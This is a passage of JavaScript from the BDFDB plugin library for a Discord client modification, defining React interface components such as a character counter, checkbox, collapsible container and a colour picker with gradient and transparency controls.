						onMouseLeave: this.props.onMouseLeave,
						children: this.props.tooltip && this.props.tooltip.text ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, Object.assign({}, this.props.tooltip, {children: inner})) : inner
					});
					return (this.props.className || "").indexOf(BDFDB.disCN.textareapickerbutton) > -1 ? BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.disCN.textareapickerbuttoncontainer,
						children: button
					}) : button;
				}
			};
			Internal.setDefaultProps(CustomComponents.ChannelTextAreaButton, {tabIndex: 0});
			
			CustomComponents.CharCounter = reactInitialized && class BDFDB_CharCounter extends Internal.LibraryModules.React.Component {
				getCounterString() {
					let input = this.refElement || {}, string = "";
					if (BDFDB.DOMUtils.containsClass(this.refElement, BDFDB.disCN.textarea)) {
						let instance = BDFDB.ReactUtils.findOwner(input, {name: "ChannelEditorContainer", up: true});
						if (instance) string = instance.props.textValue;
						else string = input.value || input.textContent || "";
					}
					else string = input.value || input.textContent || "";
					if (this.props.max && this.props.showPercentage && (string.length/this.props.max) * 100 < this.props.showPercentage) return "";
					let start = input.selectionStart || 0, end = input.selectionEnd || 0, selectlength = end - start, selection = BDFDB.DOMUtils.getSelection();
					let select = !selectlength && !selection ? 0 : (selectlength || selection.length);
					select = !select ? 0 : (select > string.length ? (end || start ? string.length - (string.length - end - start) : string.length) : select);
					let children = [
						typeof this.props.renderPrefix == "function" && this.props.renderPrefix(string.length),
						`${string.length}${!this.props.max ? "" : "/" + this.props.max}${!select ? "" : " (" + select + ")"}`,
						typeof this.props.renderSuffix == "function" && this.props.renderSuffix(string.length)
					].filter(n => n);
					if (typeof this.props.onChange == "function") this.props.onChange(this);
					return children.length == 1 ? children[0] : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
						align: Internal.LibraryComponents.Flex.Align.CENTER,
						children: children
					});
				}
				updateCounter() {
					if (!this.refElement) return;
					BDFDB.TimeUtils.clear(this.updateTimeout);
					this.updateTimeout = BDFDB.TimeUtils.timeout(this.forceUpdateCounter.bind(this), 100);
				}
				forceUpdateCounter() {
					if (!this.refElement) return;
					this.props.children = this.getCounterString();
					BDFDB.ReactUtils.forceUpdate(this);
				}
				handleSelection() {
					if (!this.refElement) return;
					let mouseMove = _ => {
						BDFDB.TimeUtils.timeout(this.forceUpdateCounter.bind(this), 10);
					};
					let mouseUp = _ => {
						document.removeEventListener("mousemove", mouseMove);
						document.removeEventListener("mouseup", mouseUp);
						if (this.refElement.selectionEnd - this.refElement.selectionStart) BDFDB.TimeUtils.timeout(_ => {
							document.addEventListener("click", click);
						});
					};
					let click = _ => {
						BDFDB.TimeUtils.timeout(this.forceUpdateCounter.bind(this), 100);
						document.removeEventListener("mousemove", mouseMove);
						document.removeEventListener("mouseup", mouseUp);
						document.removeEventListener("click", click);
					};
					document.addEventListener("mousemove", mouseMove);
					document.addEventListener("mouseup", mouseUp);
				}
				componentDidMount() {
					if (this.props.refClass) {
						let node = BDFDB.ReactUtils.findDOMNode(this);
						if (node && node.parentElement) {
							this.refElement = node.parentElement.querySelector(this.props.refClass);
							if (this.refElement) {
								if (!this._updateCounter) this._updateCounter = _ => {
									if (!document.contains(node)) BDFDB.ListenerUtils.multiRemove(this.refElement, "keydown click change", this._updateCounter);
									else this.updateCounter();
								};
								if (!this._handleSelection) this._handleSelection = _ => {
									if (!document.contains(node)) BDFDB.ListenerUtils.multiRemove(this.refElement, "mousedown", this._handleSelection);
									else this.handleSelection();
								};
								BDFDB.ListenerUtils.multiRemove(this.refElement, "mousedown", this._handleSelection);
								BDFDB.ListenerUtils.multiAdd(this.refElement, "mousedown", this._handleSelection);
								if (this.refElement.tagName == "INPUT" || this.refElement.tagName == "TEXTAREA") {
									BDFDB.ListenerUtils.multiRemove(this.refElement, "keydown click change", this._updateCounter);
									BDFDB.ListenerUtils.multiAdd(this.refElement, "keydown click change", this._updateCounter);
								}
								else {
									if (!this._mutationObserver) this._mutationObserver = new MutationObserver(changes => {
										if (!document.contains(node)) this._mutationObserver.disconnect();
										else this.updateCounter();
									});
									else this._mutationObserver.disconnect();
									this._mutationObserver.observe(this.refElement, {childList: true, subtree: true});
								}
								this.updateCounter();
							}
							else BDFDB.LogUtils.warn(["could not find referenceElement for BDFDB_CharCounter"]);
						}
					}
					else BDFDB.LogUtils.warn(["refClass can not be undefined for BDFDB_CharCounter"]);
				}
				render() {
					let string = this.getCounterString();
					BDFDB.TimeUtils.timeout(_ => string != this.getCounterString() && BDFDB.ReactUtils.forceUpdate(this));
					return BDFDB.ReactUtils.createElement("div", BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.charcounter, this.props.className),
						children: string
					}), "parsing", "max", "refClass", "renderPrefix", "renderSuffix", "showPercentage"));
				}
			};
			
			CustomComponents.Checkbox = reactInitialized && class BDFDB_Checkbox extends Internal.LibraryModules.React.Component {
				handleMouseDown(e) {if (typeof this.props.onMouseDown == "function") this.props.onMouseDown(e, this);}
				handleMouseUp(e) {if (typeof this.props.onMouseUp == "function") this.props.onMouseUp(e, this);}
				handleMouseEnter(e) {if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);}
				handleMouseLeave(e) {if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);}
				getInputMode() {
					return this.props.disabled ? "disabled" : this.props.readOnly ? "readonly" : "default";
				}
				getStyle() {
					let style = this.props.style || {};
					if (!this.props.value) return style;
					style = Object.assign({}, style);
					this.props.color = typeof this.props.getColor == "function" ? this.props.getColor(this.props.value) : this.props.color;
					if (Internal.LibraryComponents.Checkbox.Types) switch (this.props.type) {
						case Internal.LibraryComponents.Checkbox.Types.DEFAULT:
							style.borderColor = this.props.color;
							break;
						case Internal.LibraryComponents.Checkbox.Types.GHOST:
							let color = BDFDB.ColorUtils.setAlpha(this.props.color, 0.15, "RGB");
							style.backgroundColor = color;
							style.borderColor = color;
							break;
						case Internal.LibraryComponents.Checkbox.Types.INVERTED:
							style.backgroundColor = this.props.color;
							style.borderColor = this.props.color;
					}
					return style;
				}
				getColor() {
					return this.props.value ? (Internal.LibraryComponents.Checkbox.Types && this.props.type === Internal.LibraryComponents.Checkbox.Types.INVERTED ? BDFDB.DiscordConstants.Colors.WHITE : this.props.color) : "transparent";
				}
				handleChange(e) {
					this.props.value = typeof this.props.getValue == "function" ? this.props.getValue(this.props.value, e, this) : !this.props.value;
					if (typeof this.props.onChange == "function") this.props.onChange(this.props.value, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					let label = this.props.children ? BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.checkboxlabel, this.props.disabled ? BDFDB.disCN.checkboxlabeldisabled : BDFDB.disCN.checkboxlabelclickable, this.props.reverse ? BDFDB.disCN.checkboxlabelreversed : BDFDB.disCN.checkboxlabelforward),
						style: {
							lineHeight: this.props.size + "px"
						},
						children: this.props.children
					}) : null;
					return BDFDB.ReactUtils.createElement("label", {
						className: BDFDB.DOMUtils.formatClassName(this.props.disabled ? BDFDB.disCN.checkboxwrapperdisabled : BDFDB.disCN.checkboxwrapper, this.props.align, this.props.className),
						children: [
							this.props.reverse && label,
							!this.props.displayOnly && BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FocusRingScope, {
								children: BDFDB.ReactUtils.createElement("input", {
									className: BDFDB.disCN["checkboxinput" + this.getInputMode()],
									type: "checkbox",
									onClick: this.props.disabled || this.props.readOnly ? (_ => {}) : this.handleChange.bind(this),
									onContextMenu: this.props.disabled || this.props.readOnly ? (_ => {}) : this.handleChange.bind(this),
									onMouseUp: !this.props.disabled && this.handleMouseDown.bind(this),
									onMouseDown: !this.props.disabled && this.handleMouseUp.bind(this),
									onMouseEnter: !this.props.disabled && this.handleMouseEnter.bind(this),
									onMouseLeave: !this.props.disabled && this.handleMouseLeave.bind(this),
									checked: this.props.value,
									style: {
										width: this.props.size,
										height: this.props.size
									}
								})
							}),
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.checkbox, BDFDB.disCN["checkbox" + this.props.shape], this.props.value && BDFDB.disCN.checkboxchecked),
								style: Object.assign({
									width: this.props.size,
									height: this.props.size,
									borderColor: this.props.checkboxColor
								}, this.getStyle()),
								children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Checkmark, {
									width: 18,
									height: 18,
									color: this.getColor(),
									"aria-hidden": true
								})
							}),
							!this.props.reverse && label
						].filter(n => n)
					});
				}
			};
			CustomComponents.Checkbox.Types = {
				DEFAULT: "DEFAULT",
				GHOST: "GHOST",
				INVERTED: "INVERTED"
			};
			CustomComponents.Checkbox.Shapes = {
				BOX: "box",
				ROUND: "round"
			};
			Internal.setDefaultProps(CustomComponents.Checkbox, {type: CustomComponents.Checkbox.Types.INVERTED, shape: CustomComponents.Checkbox.Shapes.ROUND});
			
			CustomComponents.Clickable = reactInitialized && class BDFDB_Clickable extends Internal.LibraryModules.React.Component {
				handleClick(e) {if (typeof this.props.onClick == "function") this.props.onClick(e, this);}
				handleContextMenu(e) {if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);}
				handleMouseDown(e) {if (typeof this.props.onMouseDown == "function") this.props.onMouseDown(e, this);}
				handleMouseUp(e) {if (typeof this.props.onMouseUp == "function") this.props.onMouseUp(e, this);}
				handleMouseEnter(e) {if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);}
				handleMouseLeave(e) {if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);}
				render() {
					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.Clickable, Object.assign({}, this.props, {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, (this.props.className || "").toLowerCase().indexOf("disabled") == -1 && BDFDB.disCN.cursorpointer),
						onClick: this.handleClick.bind(this),
						onContextMenu: this.handleContextMenu.bind(this),
						onMouseUp: this.handleMouseDown.bind(this),
						onMouseDown: !this.props.disabled && this.handleMouseUp.bind(this),
						onMouseEnter: this.handleMouseEnter.bind(this),
						onMouseLeave: this.handleMouseLeave.bind(this)
					}));
				}
			};
			
			CustomComponents.CollapseContainer = reactInitialized && class BDFDB_CollapseContainer extends Internal.LibraryModules.React.Component {
				render() {
					if (!BDFDB.ObjectUtils.is(this.props.collapseStates)) this.props.collapseStates = {};
					this.props.collapsed = this.props.collapsed && (this.props.collapseStates[this.props.title] || this.props.collapseStates[this.props.title] === undefined);
					this.props.collapseStates[this.props.title] = this.props.collapsed;
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.collapsed && BDFDB.disCN.collapsecontainercollapsed, this.props.mini ? BDFDB.disCN.collapsecontainermini : BDFDB.disCN.collapsecontainer, this.props.className),
						id: this.props.id,
						children: [
							BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
								className: BDFDB.disCN.collapsecontainerheader,
								align: Internal.LibraryComponents.Flex.Align.CENTER,
								onClick: e => {
									this.props.collapsed = !this.props.collapsed;
									this.props.collapseStates[this.props.title] = this.props.collapsed;
									if (typeof this.props.onClick == "function") this.props.onClick(this.props.collapsed, this);
									BDFDB.ReactUtils.forceUpdate(this);
								},
								children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormTitle, {
									tag: Internal.LibraryComponents.FormComponents.FormTitle.Tags.H5,
									className: BDFDB.disCN.collapsecontainertitle,
									children: this.props.title
								})
							}),
							!this.props.collapsed ? BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.collapsecontainerinner,
								children: this.props.children
							}) : null
						]
					});
				}
			};
			Internal.setDefaultProps(CustomComponents.CollapseContainer, {collapsed: true, mini: true});
			
			CustomComponents.ColorPicker = reactInitialized && class BDFDB_ColorPicker extends Internal.LibraryModules.React.Component {
				constructor(props) {
					super(props);
					if (!this.state) this.state = {};
					this.state.isGradient = props.gradient && props.color && BDFDB.ObjectUtils.is(props.color);
					this.state.gradientBarEnabled = this.state.isGradient;
					this.state.draggingAlphaCursor = false;
					this.state.draggingGradientCursor = false;
					this.state.selectedGradientCursor = 0;
				}
				handleColorChange(color) {
					let changed = false;
					if (color != null) {
						changed = !BDFDB.equals(this.state.isGradient ? this.props.color[this.state.selectedGradientCursor] : this.props.color, color);
						if (this.state.isGradient) this.props.color[this.state.selectedGradientCursor] = color;
						else this.props.color = color;
					}
					else changed = true;
					if (changed) {
						if (typeof this.props.onColorChange == "function") this.props.onColorChange(BDFDB.ColorUtils.convert(this.props.color, "RGBCOMP"));
						BDFDB.ReactUtils.forceUpdate(this);
					}
				}
				render() {
					if (this.state.isGradient) this.props.color = Object.assign({}, this.props.color);
					
					let hslFormat = this.props.alpha ? "HSLA" : "HSL";
					let hexRegex = this.props.alpha ? /^#([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i : /^#([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i;
					
					let selectedColor = BDFDB.ColorUtils.convert(this.state.isGradient ? this.props.color[this.state.selectedGradientCursor] : this.props.color, hslFormat) || BDFDB.ColorUtils.convert("#000000FF", hslFormat);
					let currentGradient = (this.state.isGradient ? Object.entries(this.props.color, hslFormat) : [[0, selectedColor], [1, selectedColor]]);
					
					let [h, s, l] = BDFDB.ColorUtils.convert(selectedColor, "HSLCOMP");
					let a = BDFDB.ColorUtils.getAlpha(selectedColor);
					a = a == null ? 1 : a;
					
					let hexColor = BDFDB.ColorUtils.convert(selectedColor, this.props.alpha ? "HEXA" : "HEX");
					let hexLength = hexColor.length;
					
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PopoutFocusLock, {
						className: BDFDB.disCNS.colorpickerwrapper + BDFDB.disCN.colorpicker,
						children: [
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.colorpickerinner,
								children: [
									BDFDB.ReactUtils.createElement("div", {
										className: BDFDB.disCN.colorpickersaturation,
										children: BDFDB.ReactUtils.createElement("div", {
											className: BDFDB.disCN.colorpickersaturationcolor,
											style: {position: "absolute", top: 0, right: 0, bottom: 0, left: 0, cursor: "crosshair", backgroundColor: BDFDB.ColorUtils.convert([h, "100%", "100%"], "RGB")},
											onClick: event => {
												let rects = BDFDB.DOMUtils.getRects(BDFDB.DOMUtils.getParent(BDFDB.dotCN.colorpickersaturationcolor, event.target));
												this.handleColorChange(BDFDB.ColorUtils.convert([h, BDFDB.NumberUtils.mapRange([rects.left, rects.left + rects.width], [0, 100], event.clientX) + "%", BDFDB.NumberUtils.mapRange([rects.top, rects.top + rects.height], [100, 0], event.clientY) + "%", a], hslFormat));
											},
											onMouseDown: event => {
												let rects = BDFDB.DOMUtils.getRects(BDFDB.DOMUtils.getParent(BDFDB.dotCN.colorpickersaturationcolor, event.target));
												let mouseUp = _ => {
													document.removeEventListener("mouseup", mouseUp);
													document.removeEventListener("mousemove", mouseMove);
												};
												let mouseMove = event2 => {
													this.handleColorChange(BDFDB.ColorUtils.convert([h, BDFDB.NumberUtils.mapRange([rects.left, rects.left + rects.width], [0, 100], event2.clientX) + "%", BDFDB.NumberUtils.mapRange([rects.top, rects.top + rects.height], [100, 0], event2.clientY) + "%", a], hslFormat));
												};
												document.addEventListener("mouseup", mouseUp);
												document.addEventListener("mousemove", mouseMove);
											},
											children: [
												BDFDB.ReactUtils.createElement("style", {
													children: `${BDFDB.dotCN.colorpickersaturationwhite} {background: -webkit-linear-gradient(to right, #fff, rgba(255,255,255,0));background: linear-gradient(to right, #fff, rgba(255,255,255,0));}${BDFDB.dotCN.colorpickersaturationblack} {background: -webkit-linear-gradient(to top, #000, rgba(0,0,0,0));background: linear-gradient(to top, #000, rgba(0,0,0,0));}`
												}),
												BDFDB.ReactUtils.createElement("div", {
													className: BDFDB.disCN.colorpickersaturationwhite,
													style: {position: "absolute", top: 0, right: 0, bottom: 0, left: 0},
													children: [
														BDFDB.ReactUtils.createElement("div", {
															className: BDFDB.disCN.colorpickersaturationblack,
															style: {position: "absolute", top: 0, right: 0, bottom: 0, left: 0}
														}),
														BDFDB.ReactUtils.createElement("div", {
															className: BDFDB.disCN.colorpickersaturationcursor,
															style: {position: "absolute", cursor: "crosshair", left: s, top: `${BDFDB.NumberUtils.mapRange([0, 100], [100, 0], parseFloat(l))}%`},
															children: BDFDB.ReactUtils.createElement("div", {
																style: {width: 4, height: 4, boxShadow: "rgb(255, 255, 255) 0px 0px 0px 1.5px, rgba(0, 0, 0, 0.3) 0px 0px 1px 1px inset, rgba(0, 0, 0, 0.4) 0px 0px 1px 2px", borderRadius: "50%", transform: "translate(-2px, -2px)"}
															})
														})
													]
												})
											]
										})
									}),
									BDFDB.ReactUtils.createElement("div", {
										className: BDFDB.disCN.colorpickerhue,
										children: BDFDB.ReactUtils.createElement("div", {
											style: {position: "absolute", top: 0, right: 0, bottom: 0, left: 0},
											children: BDFDB.ReactUtils.createElement("div", {
												className: BDFDB.disCN.colorpickerhuehorizontal,
												style: {padding: "0px 2px", position: "relative", height: "100%"},
												onClick: event => {
													let rects = BDFDB.DOMUtils.getRects(BDFDB.DOMUtils.getParent(BDFDB.dotCN.colorpickerhuehorizontal, event.target));
													this.handleColorChange(BDFDB.ColorUtils.convert([BDFDB.NumberUtils.mapRange([rects.left, rects.left + rects.width], [0, 360], event.clientX), s, l, a], hslFormat));
												},
												onMouseDown: event => {
													let rects = BDFDB.DOMUtils.getRects(BDFDB.DOMUtils.getParent(BDFDB.dotCN.colorpickerhuehorizontal, event.target));
													let mouseUp = _ => {
														document.removeEventListener("mouseup", mouseUp);
														document.removeEventListener("mousemove", mouseMove);
													};
													let mouseMove = event2 => {
														this.handleColorChange(BDFDB.ColorUtils.convert([BDFDB.NumberUtils.mapRange([rects.left, rects.left + rects.width], [0, 360], event2.clientX), s, l, a], hslFormat));
													};
													document.addEventListener("mouseup", mouseUp);
													document.addEventListener("mousemove", mouseMove);
												},
												children: [
													BDFDB.ReactUtils.createElement("style", {
														children: `${BDFDB.dotCN.colorpickerhuehorizontal} {background: linear-gradient(to right, #f00 0%, #ff0 17%, #0f0 33%, #0ff 50%, #00f 67%, #f0f 83%, #f00 100%);background: -webkit-linear-gradient(to right, #f00 0%, #ff0 17%, #0f0 33%, #0ff 50%, #00f 67%, #f0f 83%, #f00 100%);}${BDFDB.dotCN.colorpickerhuevertical} {background: linear-gradient(to top, #f00 0%, #ff0 17%, #0f0 33%, #0ff 50%, #00f 67%, #f0f 83%, #f00 100%);background: -webkit-linear-gradient(to top, #f00 0%, #ff0 17%, #0f0 33%, #0ff 50%, #00f 67%, #f0f 83%, #f00 100%);}`
													}),
													BDFDB.ReactUtils.createElement("div", {
														className: BDFDB.disCN.colorpickerhuecursor,
														style: {position: "absolute", cursor: "ew-resize", left: `${BDFDB.NumberUtils.mapRange([0, 360], [0, 100], h)}%`},
														children: BDFDB.ReactUtils.createElement("div", {
															style: {marginTop: 1, width: 4, borderRadius: 1, height: 8, boxShadow: "rgba(0, 0, 0, 0.6) 0px 0px 2px", background: "rgb(255, 255, 255)", transform: "translateX(-2px)"}
														})
													})
												]
											})
										})
									}),
									this.props.alpha && BDFDB.ReactUtils.createElement("div", {
										className: BDFDB.disCN.colorpickeralpha,
										children: [
											BDFDB.ReactUtils.createElement("div", {
												style: {position: "absolute", top: 0, right: 0, bottom: 0, left: 0},
												children: BDFDB.ReactUtils.createElement("div", {
													className: BDFDB.disCN.colorpickeralphacheckered,
													style: {padding: "0px 2px", position: "relative", height: "100%"}
												})
											}),
											BDFDB.ReactUtils.createElement("div", {
												style: {position: "absolute", top: 0, right: 0, bottom: 0, left: 0},
												children: BDFDB.ReactUtils.createElement("div", {
													className: BDFDB.disCN.colorpickeralphahorizontal,
													style: {padding: "0px 2px", position: "relative", height: "100%", background: `linear-gradient(to right, ${BDFDB.ColorUtils.setAlpha([h, s, l], 0, "RGBA")}, ${BDFDB.ColorUtils.setAlpha([h, s, l], 1, "RGBA")}`},
													onClick: event => {
														let rects = BDFDB.DOMUtils.getRects(BDFDB.DOMUtils.getParent(BDFDB.dotCN.colorpickeralphahorizontal, event.target));
														this.handleColorChange(BDFDB.ColorUtils.setAlpha([h, s, l], BDFDB.NumberUtils.mapRange([rects.left, rects.left + rects.width], [0, 1], event.clientX), hslFormat));
													},
													onMouseDown: event => {
														let rects = BDFDB.DOMUtils.getRects(BDFDB.DOMUtils.getParent(BDFDB.dotCN.colorpickeralphahorizontal, event.target));
														let mouseUp = _ => {
															document.removeEventListener("mouseup", mouseUp);
															document.removeEventListener("mousemove", mouseMove);
															this.state.draggingAlphaCursor = false;
															BDFDB.ReactUtils.forceUpdate(this);
														};
														let mouseMove = event2 => {
															this.state.draggingAlphaCursor = true;
															this.handleColorChange(BDFDB.ColorUtils.setAlpha([h, s, l], BDFDB.NumberUtils.mapRange([rects.left, rects.left + rects.width], [0, 1], event2.clientX), hslFormat));
														};
														document.addEventListener("mouseup", mouseUp);
														document.addEventListener("mousemove", mouseMove);
													},
													children: BDFDB.ReactUtils.createElement("div", {
														className: BDFDB.disCN.colorpickeralphacursor,
														style: {position: "absolute", cursor: "ew-resize", left: `${a * 100}%`},
														children: [
															BDFDB.ReactUtils.createElement("div", {
																style: {marginTop: 1, width: 4, borderRadius: 1, height: 8, boxShadow: "rgba(0, 0, 0, 0.6) 0px 0px 2px", background: "rgb(255, 255, 255)", transform: "translateX(-2px)"}
															}),
															this.state.draggingAlphaCursor && BDFDB.ReactUtils.createElement("span", {
																className: BDFDB.disCN.sliderbubble,
																style: {opacity: 1, visibility: "visible", left: 2},
																children: `${Math.floor(a * 100)}%`
															})
														].filter(n => n)
													})
												})
											})
										]
									}),
									this.state.gradientBarEnabled && BDFDB.ReactUtils.createElement("div", {
										className: BDFDB.disCN.colorpickergradient,
										children: [
											BDFDB.ReactUtils.createElement("div", {
												style: {position: "absolute", top: 0, right: 0, bottom: 0, left: 0},
												children: BDFDB.ReactUtils.createElement("div", {
													className: BDFDB.disCN.colorpickergradientcheckered,
													style: {padding: "0px 2px", position: "relative", height: "100%"}
												})
											}),
											BDFDB.ReactUtils.createElement("div", {
												style: {position: "absolute", top: 0, right: 0, bottom: 0, left: 0},
												children: BDFDB.ReactUtils.createElement("div", {
													className: BDFDB.disCN.colorpickergradienthorizontal,
													style: {padding: "0px 2px", position: "relative", cursor: "copy", height: "100%", background: BDFDB.ColorUtils.createGradient(currentGradient.reduce((colorObj, posAndColor) => (colorObj[posAndColor[0]] = posAndColor[1], colorObj), {}))},
													onClick: event => {
														let rects = BDFDB.DOMUtils.getRects(event.target);
														let pos = BDFDB.NumberUtils.mapRange([rects.left, rects.left + rects.width], [0.01, 0.99], event.clientX);
														if (Object.keys(this.props.color).indexOf(pos) == -1) {
															this.props.color[pos] = BDFDB.ColorUtils.convert("#000000FF", hslFormat);
															this.state.selectedGradientCursor = pos;
															this.handleColorChange();
														}
													},
													children: currentGradient.map(posAndColor => BDFDB.ReactUtils.createElement("div", {
														className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.colorpickergradientcursor, (posAndColor[0] == 0 || posAndColor[0] == 1) && BDFDB.disCN.colorpickergradientcursoredge, this.state.selectedGradientCursor == posAndColor[0] && BDFDB.disCN.colorpickergradientcursorselected),
														style: {position: "absolute", cursor: "pointer", left: `${posAndColor[0] * 100}%`},
														onMouseDown: posAndColor[0] == 0 || posAndColor[0] == 1 ? _ => {} : event => {
															event = event.nativeEvent || event;
															let mouseMove = event2 => {
																if (Math.sqrt((event.pageX - event2.pageX)**2) > 10) {
																	document.removeEventListener("mousemove", mouseMove);
																	document.removeEventListener("mouseup", mouseUp);
																	
																	this.state.draggingGradientCursor = true;
																	let cursor = BDFDB.DOMUtils.getParent(BDFDB.dotCN.colorpickergradientcursor, event.target);
																	let rects = BDFDB.DOMUtils.getRects(cursor.parentElement);
																	
																	let releasing = _ => {
																		document.removeEventListener("mousemove", dragging);
																		document.removeEventListener("mouseup", releasing);
																		BDFDB.TimeUtils.timeout(_ => {this.state.draggingGradientCursor = false;});
																	};
																	let dragging = event3 => {
																		let pos = BDFDB.NumberUtils.mapRange([rects.left, rects.left + rects.width], [0.01, 0.99], event3.clientX);
																		if (Object.keys(this.props.color).indexOf(pos) == -1) {
																			delete this.props.color[posAndColor[0]];
																			posAndColor[0] = pos;
																			this.props.color[pos] = posAndColor[1];
																			this.state.selectedGradientCursor = pos;
																			this.handleColorChange();
																		}
																	};
																	document.addEventListener("mousemove", dragging);
																	document.addEventListener("mouseup", releasing);
																}
															};
															let mouseUp = _ => {
																document.removeEventListener("mousemove", mouseMove);
																document.removeEventListener("mouseup", mouseUp);
															};
															document.addEventListener("mousemove", mouseMove);
															document.addEventListener("mouseup", mouseUp);
														},
														onClick: event => {
															BDFDB.ListenerUtils.stopEvent(event);
															if (!this.state.draggingGradientCursor) {
																this.state.selectedGradientCursor = posAndColor[0];
																BDFDB.ReactUtils.forceUpdate(this);
															}
														},
														onContextMenu: posAndColor[0] == 0 || posAndColor[0] == 1 ? _ => {} : event => {
															BDFDB.ListenerUtils.stopEvent(event);
															delete this.props.color[posAndColor[0]];
															this.state.selectedGradientCursor = 0;
															this.handleColorChange();
														},
														children: BDFDB.ReactUtils.createElement("div", {
															style: {background: BDFDB.ColorUtils.convert(posAndColor[1], "RGBA")}
														})
													}))
												})
											})
										]
									})
								].filter(n => n)
							}),
							BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextInput, {
								className: BDFDB.disCNS.colorpickerhexinput + BDFDB.disCN.margintop8,
								maxLength: this.props.alpha ? 9 : 7,
								valuePrefix: "#",
								value: hexColor,
								autoFocus: true,
								onChange: value => {
									const oldLength = hexLength;
									hexLength = (value || "").length;
									if (this.props.alpha && (oldLength > 8 || oldLength < 6) && hexLength == 7) value += "FF";
									if (hexRegex.test(value)) this.handleColorChange(value);
								},
								inputChildren: this.props.gradient && BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
									text: BDFDB.LanguageUtils.LibraryStrings.gradient,
									children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, {
										className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.colorpickergradientbutton, this.state.gradientBarEnabled && BDFDB.disCN.colorpickergradientbuttonenabled),
										children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
											nativeClass: true,
											width: 28,
											height: 28,
											name: Internal.LibraryComponents.SvgIcon.Names.GRADIENT
										}),
										onClick: _ => {
											this.state.gradientBarEnabled = !this.state.gradientBarEnabled;
											if (this.state.gradientBarEnabled && !this.state.isGradient) this.props.color = {0: selectedColor, 1: selectedColor};
											else if (!this.state.gradientBarEnabled && this.state.isGradient) this.props.color = selectedColor;
											this.state.isGradient = this.props.color && BDFDB.ObjectUtils.is(this.props.color);
											this.handleColorChange();
										}
									})
								})
							}),
							BDFDB.ReactUtils.createElement("div", {
								className: "move-corners",
								children: [{top: 0, left: 0}, {top: 0, right: 0}, {bottom: 0, right: 0}, {bottom: 0, left: 0}].map(pos => BDFDB.ReactUtils.createElement("div", {
									className: "move-corner",
									onMouseDown: e => {
										if (!this.domElementRef.current) return;
										let rects = BDFDB.DOMUtils.getRects(this.domElementRef.current);
										let left = rects.left, top = rects.top;
										let oldX = e.pageX, oldY = e.pageY;
										let mouseUp = _ => {
											document.removeEventListener("mouseup", mouseUp);
											document.removeEventListener("mousemove", mouseMove);
										};
										let mouseMove = e2 => {
											left = left - (oldX - e2.pageX), top = top - (oldY - e2.pageY);
											oldX = e2.pageX, oldY = e2.pageY;
											this.domElementRef.current.style.setProperty("left", `${left}px`, "important");
											this.domElementRef.current.style.setProperty("top", `${top}px`, "important");
										};
										document.addEventListener("mouseup", mouseUp);
										document.addEventListener("mousemove", mouseMove);
									},
									style: Object.assign({}, pos, {width: 10, height: 10, cursor: "move", position: "absolute"})
								}))
							})
						]
					});
				}
			};
			
			CustomComponents.ColorSwatches = reactInitialized && class BDFDB_ColorSwatches extends Internal.LibraryModules.React.Component {
				ColorSwatch(props) {
					const swatches = props.swatches;
					let useWhite = !BDFDB.ColorUtils.isBright(props.color);
					let swatch = BDFDB.ReactUtils.createElement("button", {
						type: "button",
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.colorpickerswatch, props.isSingle && BDFDB.disCN.colorpickerswatchsingle, props.isDisabled && BDFDB.disCN.colorpickerswatchdisabled, props.isSelected && BDFDB.disCN.colorpickerswatchselected, props.isCustom && BDFDB.disCN.colorpickerswatchcustom, props.color == null && BDFDB.disCN.colorpickerswatchnocolor),
						number: props.number,
						disabled: props.isDisabled,
						onClick: _ => {
							if (!props.isSelected) {
								let color = props.isCustom && props.color == null ? (swatches.props.color || swatches.props.defaultCustomColor || "rgba(0, 0, 0, 1)") : props.color;
								if (typeof swatches.props.onColorChange == "function") swatches.props.onColorChange(BDFDB.ColorUtils.convert(color, "RGBCOMP"));
								swatches.props.color = color;
								swatches.props.customColor = props.isCustom ? color : swatches.props.customColor;
								swatches.props.customSelected = props.isCustom;
								BDFDB.ReactUtils.forceUpdate(swatches);
							}
						},
						style: Object.assign({}, props.style, {
							background: BDFDB.ObjectUtils.is(props.color) ? BDFDB.ColorUtils.createGradient(props.color) : BDFDB.ColorUtils.convert(props.color, "RGBA")
						}),
						children: [
							props.isCustom || props.isSingle ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
								className: BDFDB.disCN.colorpickerswatchdropper,
								foreground: BDFDB.disCN.colorpickerswatchdropperfg,
								name: Internal.LibraryComponents.SvgIcon.Names.DROPPER,
								width: props.isCustom ? 14 : 10,
								height: props.isCustom ? 14 : 10,
